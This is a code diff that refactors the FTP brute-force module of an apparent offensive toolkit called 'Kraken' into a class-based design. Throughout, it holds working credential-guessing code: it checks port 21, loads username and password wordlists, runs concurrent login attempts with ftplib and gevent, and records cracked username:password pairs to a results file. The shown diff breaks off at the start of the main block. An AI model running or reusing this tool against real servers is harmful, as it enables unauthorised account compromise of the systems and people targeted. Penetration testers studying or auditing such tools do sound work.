@@ -1,147 +1,134 @@
 import os
 import sys
-import time
 import socket
 from ftplib import FTP
+from typing import List, Optional, Any
+from colorama import Fore, Style
 import gevent
 from gevent import monkey
 from gevent.pool import Pool
-from colorama import Fore, Style
 
 monkey.patch_all()
 
-from core.ui import clear_console, display_banner, status, success, error, info
-from core.utils import load_file_lines
+from core.module import KrakenModule
+from core.ui import success, error, info
 from core.logger import setup_logger
 
-script_dir = os.path.dirname(os.path.abspath(__file__))
-results_dir = os.path.join(script_dir, '..', 'Results')
-logs_dir = os.path.join(script_dir, '..', 'Logs')
-os.makedirs(results_dir, exist_ok=True)
+logger = setup_logger(os.path.join(os.path.dirname(os.path.abspath(__file__)), '..', 'Logs', 'ftp_brute_force.log'))
 
-logger = setup_logger(os.path.join(logs_dir, 'ftp_brute_force.log'))
+class FTPBruteForce(KrakenModule):
+    def __init__(self):
+        super().__init__(name="FTP", default_port=21)
+        self.result_file_path = os.path.join(self.results_dir, "ftp_results.txt")
 
-def check_ftp_port(target):
-    try:
-        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
-            sock.settimeout(5)
-            return sock.connect_ex((target, 21)) == 0
-    except socket.gaierror as e:
-        logger.error(f"Network error: {e}")
-        return False
-
-def login_attempt(ip, username, password, attempt_number, total_attempts, start_time, result_file):
-    def format_output(succeeded):
-        elapsed_time = time.time() - start_time
-        percentage = (attempt_number / total_attempts) * 100
-        estimated_total_time = elapsed_time / (attempt_number / total_attempts) if attempt_number > 0 else 0
-        remaining_time = estimated_total_time - elapsed_time
-        time_remaining_str = time.strftime('%H:%M:%S', time.gmtime(remaining_time))
-        s = "Success" if succeeded else ""
-        return f"\r[{attempt_number}/{total_attempts}] Tested - {percentage:.2f}% | Expected Left: {time_remaining_str} | Current: {username}:{password} {s}"
-
-    try:
-        with FTP() as ftp:
-            ftp.connect(ip, timeout=5)
-            ftp.login(user=username, passwd=password)
-            sys.stdout.write('\033[K')
-            success_msg = format_output(True)
-            print(Style.BRIGHT + Fore.GREEN + success_msg + Style.RESET_ALL)
-            logger.info(success_msg.strip())
-            result_file.write(success_msg.strip() + "\n")
-            result_file.flush()
-            return success_msg
-    except Exception as e:
-        sys.stdout.write('\033[K')
-        fail_msg = format_output(False)
-        print(Fore.WHITE + fail_msg, end='', flush=True)
-        logger.debug(f"Login failed for {username}:{password} @ {ip}: {e}")
-        return None
-
-def execute_brute(ip, usernames, passwords, threads):
-    total_attempts = len(usernames) * len(passwords)
-    start_time = time.time()
-    
-    # Needs to be a list containing an integer so it can be modified in a nested func
-    attempt_counter = [0]
-    results = []
-    pool = Pool(threads)
-
-    result_file_path = os.path.join(results_dir, "ftp_results.txt")
-    with open(result_file_path, "a") as result_file:
-        def handle_result(username, password):
-            attempt_counter[0] += 1
-            result = login_attempt(ip, username, password, attempt_counter[0], total_attempts, start_time, result_file)
-            if result:
-                results.append(result)
-
+    def check_target(self, target: str, port: Optional[int] = None) -> bool:
+        port = port or self.default_port
         try:
-            for username in usernames:
-                for password in passwords:
-                    pool.spawn(handle_result, username, password)
-            pool.join()
-        except KeyboardInterrupt:
-            print(Fore.YELLOW + "\n[!] Script interrupted by user. Shutting down threads...")
-            os._exit(0)
+            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
+                sock.settimeout(5)
+                return sock.connect_ex((target, port)) == 0
+        except socket.gaierror as e:
+            logger.error(f"Network error: {e}")
+            return False
 
-    logger.info("Brute force process completed.")
+    def attempt_login(self, ip: str, username: str, password: str, progress: Any, task_id: Any) -> Optional[str]:
+        try:
+            with FTP() as ftp:
+                ftp.connect(ip, timeout=5)
+                ftp.login(user=username, passwd=password)
+                
+                # Successful Login
+                success_msg = f"{username}:{password}"
+                progress.console.print(f"[bold green][+] SUCCESS: {success_msg}[/bold green]")
+                logger.info(f"Success: {success_msg} @ {ip}")
+                
+                with open(self.result_file_path, "a") as result_file:
+                    result_file.write(f"{ip} -> {success_msg}\n")
+                
+                return success_msg
+        except Exception as e:
+            logger.debug(f"Login failed for {username}:{password} @ {ip}: {e}")
+            return None
+        finally:
+            progress.update(task_id, advance=1, current_attempt=f"{username}:{password}")
 
-def run(target, users_file, username, passwords_file, threads):
-    clear_console()
-    display_banner("Kraken FTP Brute-Force")
-    info("\n" + "="*80 + "\n")
+    def execute_brute(self, ip: str, usernames: List[str], passwords: List[str], threads: int) -> None:
+        total_attempts = len(usernames) * len(passwords)
+        pool = Pool(threads)
 
-    if not check_ftp_port(target):
-        error('FTP port 21 is not open. Check the target IP or server status.')
-        sys.exit(1)
+        with self.create_progress_bar() as progress:
+            task_id = progress.add_task("[cyan]Brute Forcing...", total=total_attempts, current_attempt="Initializing...")
+            
+            def handle_result(username: str, password: str) -> None:
+                self.attempt_login(ip, username, password, progress, task_id)
 
-    usernames = []
-    if users_file:
-        usernames = load_file_lines(users_file)
-    elif username:
-        usernames = [username]
-    else:
-        error('You must specify either a users list or a single username.')
-        sys.exit(1)
-    
-    passwords = load_file_lines(passwords_file)
-    if not passwords:
-        error(f'Password list {passwords_file} is empty or missing.')
-        sys.exit(1)
-        
-    execute_brute(target, usernames, passwords, threads)
+            try:
+                for username in usernames:
+                    for password in passwords:
+                        pool.spawn(handle_result, username, password)
+                pool.join()
+            except KeyboardInterrupt:
+                progress.stop()
+                progress.console.print("[bold yellow]\n[!] Script interrupted by user. Shutting down threads...[/bold yellow]")
+                os._exit(0)
 
-def run_interactive():
-    clear_console()
-    display_banner("Kraken FTP Brute-Force")
-    
-    print(Style.BRIGHT + Fore.YELLOW + "Input Configuration" + Style.RESET_ALL)
-    target_ip = input(Fore.WHITE + "Enter the FTP server IP address: ").strip()
+        logger.info("Brute force process completed.")
 
-    if check_ftp_port(target_ip):
-        use_list = input(Fore.WHITE + "Use a username list? (Y/n): ").strip().upper() != 'N'
-        if use_list:
-            user_file_default = os.path.join(script_dir, "..", "wordlists", "users.txt")
-            user_file = input(Fore.WHITE + f"Enter path to username list (default: users.txt): ").strip() or user_file_default
-            users = load_file_lines(user_file)
-        else:
-            users = [input(Fore.WHITE + 'Enter single username: ').strip()]
+    def run(self, target: str, users_file: Optional[str], username: Optional[str], passwords_file: str, threads: int) -> None:
+        self.setup_ui()
 
-        pwd_file_default = os.path.join(script_dir, "..", "wordlists", "passwords.txt")
-        pwd_file = input(Fore.WHITE + f"Enter path to password list (default: passwords.txt): ").strip() or pwd_file_default
-        pwds = load_file_lines(pwd_file)
-
-        threads = int(input(Fore.WHITE + "Enter number of threads to use (default: 40, press Enter for default): ") or 40)
-        
-        if not users or not pwds:
-            error("Error: The username or password list is empty or could not be found.")
+        if not self.check_target(target):
+            error('FTP port 21 is not open. Check the target IP or server status.')
             sys.exit(1)
 
-        info("\n" + "="*80 + "\n")
-        execute_brute(target_ip, users, pwds, threads)
-    else:
-        error('FTP port 21 is not open. Check the target IP or server status.')
-        sys.exit(1)
+        usernames = []
+        if users_file:
+            usernames = self._get_wordlist(users_file, "users.txt", "path to username list", is_user=True)
+            if not usernames:
+                error(f'User list {users_file} is empty or missing.')
+                sys.exit(1)
+        elif username:
+            usernames = [username]
+        else:
+            error('You must specify either a users list or a single username.')
+            sys.exit(1)
+        
+        passwords = self._get_wordlist(passwords_file, "passwords.txt", "path to password list")
+        self.execute_brute(target, usernames, passwords, threads)
+
+    def run_interactive(self) -> None:
+        self.setup_ui()
+        print(Style.BRIGHT + Fore.YELLOW + "Input Configuration" + Style.RESET_ALL)
+        
+        target_ip = input(Fore.WHITE + "Enter the FTP server IP address: ").strip()
+
+        if self.check_target(target_ip):
+            use_list = input(Fore.WHITE + "Use a username list? (Y/n): ").strip().upper() != 'N'
+            if use_list:
+                users = self._get_wordlist(None, "users.txt", "Enter path to username list", is_user=True)
+                if not users:
+                    error("Error: The username list is empty or could not be found.")
+                    sys.exit(1)
+            else:
+                users = [input(Fore.WHITE + 'Enter single username: ').strip()]
+
+            pwds = self._get_wordlist(None, "passwords.txt", "Enter path to password list")
+            threads = int(input(Fore.WHITE + "Enter number of threads to use (default: 40): ") or 40)
+            
+            info("\n" + "="*80 + "\n")
+            self.execute_brute(target_ip, users, pwds, threads)
+        else:
+            error('FTP port 21 is not open. Check the target IP or server status.')
+            sys.exit(1)
+
+# Preserve compatibility if external scripts import/call this directly.
+_module = FTPBruteForce()
+
+def run(*args, **kwargs):
+    _module.run(*args, **kwargs)
+
+def run_interactive():
+    _module.run_interactive()
 
 if __name__ == "__main__":
     try:
